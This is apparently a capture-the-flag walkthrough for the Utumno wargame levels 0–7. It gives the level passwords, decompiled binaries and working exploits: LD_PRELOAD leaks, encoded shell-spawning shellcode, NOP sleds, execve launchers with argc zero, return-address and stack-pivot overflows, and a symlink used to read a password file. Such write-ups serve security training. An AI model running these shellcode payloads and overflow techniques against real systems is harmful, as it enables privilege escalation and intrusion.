############################################### Utumno ############################################

Level:     0
Exploit:   LD_PRELOAD Memory Leaking
Password:  ytvWa6DzmL

$ ls -al utumno0
---x--x--- 1 utumno1 utumno0 12212 Oct 14 09:28 utumno0

$ ./utumno0
Read me! :P

The executable file is readonly. Cannot use gdb, ldd, ltrace & strace to analyze the binary 
Executing the binary shows that the program prints.
Because the program prints, it will likely use printf or puts libc function. Use LD_PRELOAD to 
overwrite the puts() function. The overwritten function can leak memory using format string vuln.

custom puts implementation:
  #include <stdio.h>
  int puts(const char* str) {
		  printf("Leaking Memory Addrs: %08x %08x ...\n");
			return 0;
	}

Generate shared object file
$ gcc -m32 -c -fPIC custom_puts.c -o puts.o
$ gcc -m32 -shared -o puts.so puts.o

$ export LD_PRELOAD=/.../puts.so
$ ./utumno0
Leaking Memory Addrs: f7fdabb0 ffffd3c0 f7fbd159 0804907d f7fa8e34 ffffd398 0804917d 0804a01d 0804a008 00000000

We find a few addresses that are in user space. Printout the memory locations as strings. Modify 
the custom puts implementation to printf("%c", <addr>) for all user space addresses

��
���
Read me! :P
password: ytvWa6DzmL

###################################################################################################

Level:    1
Exploit:  Reverse Engineering & Shellcoding
Password: RdUzprHKSm

$ ./utumno1
Results in nothing. ltrace simply exits immediately. Disassemble main in gdb shows that program
checks for one arg

Check for calls before and after providing 1 argument
$ ltrace ./utumno1
__libc_start_main(0x80490dd, 1, 0xffffd474, 0 <unfinished ...>
exit(1 <no return ...>
+++ exited (status 1) +++

$ ltrace ./utumno1 a
__libc_start_main(0x80490dd, 2, 0xffffd474, 0 <unfinished ...>
mmap(0, 4096, 7, 34)                                                               = 0xf7fc0000
opendir("a")                                                                       = 0
exit(1 <no return ...>
+++ exited (status 1) +++

Both the disassembly and ltrace show that the program attempts to call opendir on the argument
When providing an argument to a valid directory ltrace looks like:
$ ltrace ./utumno1 /tmp/u00
__libc_start_main(0x80490dd, 2, 0xffffd474, 0 <unfinished ...>
mmap(0, 4096, 7, 34)                                                               = 0xf7fc0000
opendir("/tmp/u00")                                                                = 0x804c1a0
readdir(0x804c1a0)                                                                 = 0x804c1bc
strncmp("sh_", ".", 3)                                                             = 1
readdir(0x804c1a0)                                                                 = 0x804c1cc
strncmp("sh_", "..", 3)                                                            = 1
readdir(0x804c1a0)                                                                 = 0
+++ exited (status 0) +++

Disassembly & ltrace show that program iterates over the entires in directory and look for matching
name to sh_. It is then calls run() on the entry name
Add the shellcode after the sh_ in the filename.

touch sh_$(perl -e 'print "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71
\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54
\x8a\xe2\xce\x81"')

###################################################################################################

Level:    2
Exploit:  Memory corruption from argc = 0
Password: h3kVKJZuid

Disassembling the program shows the following
	int main(int argc, char *argv[]) {
		if (argc == 0) {}             <--- this condition allows for progression  
		else if (argc == 1) {
			if (argv[0][0] == '\0') {}  <--- this condition allows for progression
			else {
				 puts("some string"); 
				 exit(1);
			}
		} else {
			puts("some string");  
			exit(1);
		}

		strcpy((char *)(argv[0] + 0x28), (char *)( (char *)&argc - 12 )); <--- argv[0] will segfault
		return 0;
	}

In order to launch the program with argc = 0, the only way is to execute with no args from another 
program
	#include <unistd.h>
	int main() {
		char *args[] = { NULL };
		char *envp[] = {
      "AAAA",
			...
      NULL
		};
		execve("/utumno/utumno2", args, envp);
		return 0;
	}

Important note is that argc, argv, and envp are all contiguous on the stack. Because argv is null, argv[1]
simply reads from environment variable

    Lower address
+-------------------+ <---- the initial stack pointer
|       argc        |
+-------------------+
|      argv[0]      |  -> points to the null-terminated first argument
+-------------------+
|      argv[1]      |  -> points to the null-terminated second argument
+-------------------+
|       ...         |
+-------------------+
|   argv[argc-1]    |  -> points to the null-terminated last argument
+-------------------+
|       NULL        |
+-------------------+
|      envp[0]      |  -> points to the null-terminated first environment variable
+-------------------+
|      envp[1]      |  -> points to the null-terminated second environment variable
+-------------------+
|       ...         |
+-------------------+
|      envp[N]      |  -> points to the null-terminated last environment variable
+-------------------+
|       NULL        |
+-------------------+
   Higher address

This allows us to reach the strcpy. 
$ ltrace ./launcher
__libc_start_main(0x5655619d, 1, 0xffffd474, 0 <unfinished ...>
execve(0x56557030, 0xffffd374, 0xffffd378, 0x565561b4 <no return ...>
--- Called exec() ---
__libc_start_main(0x804909d, 1, 0xffffdea4, 0 <unfinished ...>
strcpy(0xffffddcc, "IIII" <no return ...>

The strcpy will be able to overwrite the return address
Constructing envp variable 9, which the program copies to be AAAABBBBCCCCDDDDEEEE...
shows that the program segfaults on 0x45454545. This means that the 16 - 20th bytes of the 9th env 
variable overwrites the return address.
We can place shellcode after the return address location. The new return address can now point to the shellcode

Finalize program to execute priviledge execution
	int main() {
		char *args[] = { NULL };
    char *envp[] = {
      "JUNK",
      "JUNK",
      "JUNK",
      "JUNK",
      "JUNK",
      "JUNK",
      "JUNK",
      "JUNK",
      "AAAABBBBCCCCDDDD\xa0\xdd\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
			\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9
			\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a
			\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53
			\x52\x54\x8a\xe2\xce\x81",
      NULL
    };
    execve("/utumno/utumno2", args, envp);
    return 0;
  }

###################################################################################################

Level:    3
Exploit:  buffer overflow
Password: qHWLExh7C5

Decompiling the binary (ghidra)
	int main(int argc,char **argv) {
		int iVar1;
		char b [24];
		char a [24];
		int c;
		int i;
		
		i = 0;
		while( true ) {
			iVar1 = getchar();
			if ((iVar1 == -1) || (0x17 < i)) break;
			b[i] = (char)iVar1;
			b[i] = b[i] ^ (char)i * '\x03';
			iVar1 = getchar();
			a[b[i]] = (char)iVar1;
			i = i + 1;
		}
		return 0;
  }

Shows that the first char determines where the second char is written in memory. With this we can
overwrite the return address

ret addr: 0xffffd39c 
a[24]:    0xffffd378
Difference is 0x24 -> 36 bytes
Therefore the return address is at a[36] ~ a[39]

To overwrite the return address with 0x41424344
	1st char: 0x24; 2nd char: 0x44;
	i = 0, 0x24 ^ (0x0 * 0x3) = 0x24 ^ 0x0, b[0] = 0x24 = 36, write 0x44 to a[36]

	3rd char: 0x26; 4th char: 0x43;
	i = 1, 0x26 ^ (0x1 * 0x3) = 0x26 ^ 0x3, b[1] = 0x25 = 37, write 0x43 to a[37]

	5th char: 0x20; 6th char: 0x42;
	i = 2, 0x20 ^ (0x2 * 0x3) = 0x20 ^ 0x6, b[2] = 0x26 = 38, write 0x42 to a[38]

	5th char: 0x2e; 6th char: 0x41;
	i = 3, 0x2e ^ (0x3 * 0x3) = 0x2e ^ 0x9, b[3] = 0x27 = 39, write 0x41 to a[38]

perl -e 'print "\x24\x44\x26\x43\x20\x42\x2e\x41"'

To achieve priviledge escalation, the even char inputs must be set to exploit payload
$ export EXPLOIT=$(perl -e 'print "\x90"x100 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
  \xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b
	\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')

Above payload did not work??? Instead payload for cat /tmp/axc
$ ln -s /etc/utumno_pass/utumno4 /tmp/axc
$ export EXPLOIT=$(perl -e 'print "\x90"x500 . "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f
  \x62\x69\x6e\x89\xe3\x52\x68\x2f\x61\x78\x63\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89
	\xe1\xcd\x80"')

Address of the EXPLOIT environment var is found 0xffffd3df. Set this address to overwrite the 
return address. Exploit below uses 0xffffd500
perl -e 'print "\x24\x00\x26\xd5\x20\xff\x2e\xff"' | ./utumno3

###################################################################################################

Level:    4
Exploit:  buffer overflow
Password: vY134qxapL

GDB is unable to properly analyze the program
Program requires 2 args otherwise segfaults. Decompiling shows the following:
	int main(int argc,char **argv) {
		int val;
		char b [64];
		char c [65212];
		ushort j;
		int i;
		
		val = atoi(argv[1]);
		if (63 < (ushort)val) {   <-- condition length check 
			exit(1);
		}
		memcpy(b,argv[2],val);
		return 0;
	}

Program copies second arg of length defined by first arg somewhere in memory. This can obviously
be used to overwrite memory perhaps return address. To pass condition only the last 2 bytes must
be less than 63 not the entire argument 1.
A large value such as 65536 is out of range and thus (ushort)val will be 0, <= 63.

For example input of ./utumno4 65536 (perl -e 'print "\x41"x65535') will cause a segfault because
it will have overwritten the return address. To find the exact address which overwrites the return
address use pwntools:
	python3 - << 'EOF' > in     or     python3 - << 'EOF'
	from pwn import *
	print(cyclic(300))     or     print(cyclic_find(0x6161616c))
	EOF

Using this found that the buffer offset of 65284 overwrites the return address. 

In gdb:
  run 65536 "$(perl -e 'print "\x41"x65286 . "\x42"x4 . "\x43"x246')"
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

Now we can create an environment var or buffer, with exploit and overwrite the return address to 
point to the shellcode.

$ export EXPLOIT=$(perl -e 'print "\x90"x100 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
  \xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b
	\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')

Using gdb, EXPLOIT environment variable was found at: 0xffffd55e
After playing around with slightly varying return addresses, the following exploit worked
$ ./utumno4 65536 $(perl -e 'print "\x41"x65286 . "\x50\xd5\xff\xff"x4 . "\x43"x246')

###################################################################################################

Level:    5
Exploit:  buffer overflow
Password: aGlKWrixsh

Decompiling the binary roughly shows the following:
	int main(int argc,char **argv) {
		if ((argc != 0) && ((argc != 1 || (**argv != '\0')))) {
			puts("Aw..");
											/* WARNING: Subroutine does not return */
			exit(1);
		}
		printf("Here we go - %s\n", argv[10]); <-- segfaults
		hihi(argv[10]);
		return 0;
	}

Must bypass the initial conditions. Use the previous method of invoking the binary from another 
program with no args. program printf with argv[10]. This is equivalent to 9th environment var.
#include <unistd.h>
int main() {
        char *args[] = { NULL };
        char *envp[] = { 
                "AAAA",
								...
                "",  <-- envp[8] associates to argv[10]
                NULL };
        execve("/utumno/utumno5", args, envp);
        return 0;
}

Decompiling hihi function:
void hihi(const char *input) {
    char buffer[12];
    if (strlen(input) > 19) {
        strncpy(buffer, input, 20);    <-- Use this to overwrite return address
    } else {
        strcpy(buffer, input);
    }
}
A buffer overflow occurs inside of hihi from argv[10] or envp[9]. We can modify the return address
to point to environment variable which holds exploit.

I find exploit environment variable address at: 0xffffdf3b ~ 0xffffdf40

The final program which gives immediate priviledge escalation
  #include <unistd.h>
  int main() {
    char *args[] = { NULL };
    char *envp[] = { 
      "AAAA",
      "BBBB",
      "CCCC",
      "DDDD",
      "EEEE",
      "FFFF",
      "AAAA",
      "BBBB",
      "AAAABBBBCCCCDDDD\x40\xdf\xff\xff",
      "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
       \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
       \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
       \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
       \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
       \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9
       \xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b
       \x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30
       \x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81",
      NULL };
    execve("/utumno/utumno5", args, envp);
    return 0;
  }

###################################################################################################

Level:    6
Exploit:  stack overwrite
Password: VHOuCx7iA5

Appears to require 3 arguments
	int main(int argc,char **argv) {
		b;
		int pos;
		int val;
		if (argc < 3) {            <-- Requires 3 args 
			puts("Missing args");
			exit(1);
		}
		b.p = malloc(0x20);
		if (b.p == (char *)0x0) {
			puts("Sorry, ran out of memory :-(");
			exit(1);
		}
		uVar1 = strtoul(argv[2],(char **)0x0,0x10);
		uVar2 = strtoul(argv[1],(char **)0x0,10);
		if (10 < (int)uVar2) {
			puts("Illegal position in table, quitting..");
			exit(1);
		}
		b.table[uVar2] = uVar1;            <-- arg1 can be negative?
		strcpy(b.p, argv[3]);              <-- potential buffer overflow?
		printf("Table position %d has value %d\nDescription: %s\n", uVar2, b.table[uVar2], b.p);
		return 0;
	}

Find the location where b.table & b.p are.
b.p at:             0xffffd344   
b.table[0] at:      0xffffd348  

This means that b.table[-1] will overwrite b.p. Therefore we can write argv[3] to address argv[2]
$ ./utumno6 -1 [RET ADDR POS] [NEW RET ADDR VALUE]

An important problem is that the return val's address will be slightly different outside of gdb.
Must guess both the ret val's addr & guess the address within NOP sled in exploit. Because of this,
it is helpful to leverage a massive NOP sled, kilobytes to ease the guessing process.

Place EXPLOIT environment variable. Set the EXPLOIT ADDR to the environment variable.
$ export EXPLOIT=$(perl -e 'print "\x90"x1000 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
  \xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b
  \x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
ret val addr: 0xffffcf4c
exploit env var: 0xffffd1d9
$ ./utumno6 -1 0xffffcf6c $(perl -e 'print "\xf0\xd1\xff\xff"')

###################################################################################################

Level:    7
Exploit:  buffer overflow/stack pivoting
Password: 

ghidra output:
  int main(int argc,char **argv) {
    if (argc < 2) {
      exit(1);
    }
    puts("lol ulrich && fuck hector");
    vuln(argv[1]);
    return 0;
  }

  int vuln(char *arg) {
    int iVar1;
    char buf [128];
    jmp_buf foo;
    int i;
    jbp = &foo;
    iVar1 = _setjmp((__jmp_buf_tag *)foo);  <-- save pt
    if (iVar1 == 0) {
      strcpy(buf,arg);                      <-- overflow 
      jmp(0x17);                            <-- teleport (rewinds stack to point at save pt)
    }
    return 0;
  }

The buffer overflow can overwrite these registers however EIP is unusable because of pointer 
mangling (encrypted).
Therefore instead of overflowing EIP, overwrite EBP with 144 bytes.

    Lower address
+-------------------+ 
|     buf[128]      |  -> overflow this 
+-------------------+ 
|        EBX        |  -> +4 jmpbuf 
+-------------------+
|        ESI        |  -> +8 jmpbuf 
+-------------------+
|        EDI        |  -> +12 jmpbuf 
+-------------------+
|        EBP        |  -> +16 jmpbuf 
+-------------------+
|        ESP        |  -> jmpbuf (mangled)
+-------------------+
|        EIP        |  -> jmpbuf (mangled)
+-------------------+
|        ...        |
+-------------------+
|        EBP        |  -> saved EBP of vuln function
+-------------------+
|        EIP        |  -> saved EIP of vuln function (return address)
+-------------------+
   Higher address

Overwriting EBP allows for stack pivoting. When the vuln function ends, it will end with:
1.   leave    mov ESP, EBP       restores ESP to EBP
2.            pop EBP            pops the saved base pointer to EBP
3.   ret      pop EIP            pops the value at the top of the stack, ESP to EIP, jumping to addr

1. Since EBP is corrupted, leave instr will have ESP point to corrupted value
2. First 4 bytes from corrupted stack pointer will be popped into EBP
3. Next 4 bytes from curropted stack pointer will be popped into EIP

Using GDB identify the addresses
buf:     0xffffd1cc
eip:     0xffffd1ec  (somewhere nice in the middle of NOP sled)

The following works in gdb.
	$(perl -e 'print "AAAA" . "\xec\xd1\xff\xff" . "\x90"x75 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c
	 \x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71
	 \x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"
	 . "\xcc\xd1\xff\xff"')

Because of stack shifting, we will need to slightly adjust the FAKE EBP and FAKE EIP value.

###################################################################################################

